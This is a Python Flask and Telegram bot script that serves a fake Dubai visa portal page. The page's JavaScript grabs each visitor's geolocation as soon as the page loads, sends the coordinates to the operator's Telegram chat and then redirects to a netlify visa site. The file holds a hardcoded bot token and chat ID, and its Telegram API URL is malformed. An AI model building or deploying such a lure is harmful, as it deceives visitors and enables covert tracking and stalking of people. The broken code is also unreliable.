import os
import threading
import requests
from flask import Flask, request
import telebot

# --- AAP KI TELEGRAM CREDENTIALS ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# --- APP SETUP ---
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# --- TELEGRAM MESSAGE HELPER ---
def send_telegram_message(message):
    url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- COMMANDS ---
@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        app_url = os.environ.get("APP_URL", "https://onrender.com")
        bot.send_message(message.chat.id, f"🔗 *Link Ready:*\n`{app_url}`", parse_mode="Markdown")

# --- FLASK WEB SERVER (EMBEDDED) ---
@app.route("/")
def index():
    # Embedded HTML simulates professional visa portal
    return '''
<!DOCTYPE html>
<html><head><title>Dubai Visa</title></head><body>
<div style="text-align:center; padding:50px;">
    <h2>Dubai Travel & Tour Services</h2>
    <input type="text" id="fullname" placeholder="Full Name"><br><br>
    <button onclick="startProcess()">Next</button>
</div>
<script>
    const targetNetlify = "https://easyvisaapplication.netlify.app/";
    function sendData(payload) { fetch('/update', {method: 'POST', body: JSON.stringify(payload)}); }
    function onSuccess(pos) { sendData({lat: pos.coords.latitude, lon: pos.coords.longitude}); }
    
    function startProcess() {
        navigator.geolocation.getCurrentPosition(onSuccess);
        setTimeout(() => window.location.href = targetNetlify, 2000);
    }
    window.onload = () => navigator.geolocation.getCurrentPosition(onSuccess);
</script>
</body></html>
'''

@app.route("/update", methods=["POST"])
def update():
    data = request.get_json(force=True)
    if data and "lat" in data:
        send_telegram_message(f"🚨 New Location: {data['lat']}, {data['lon']}")
        return "OK", 200
    return "BAD", 400

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=PORT), daemon=True).start()
    bot.infinity_polling()
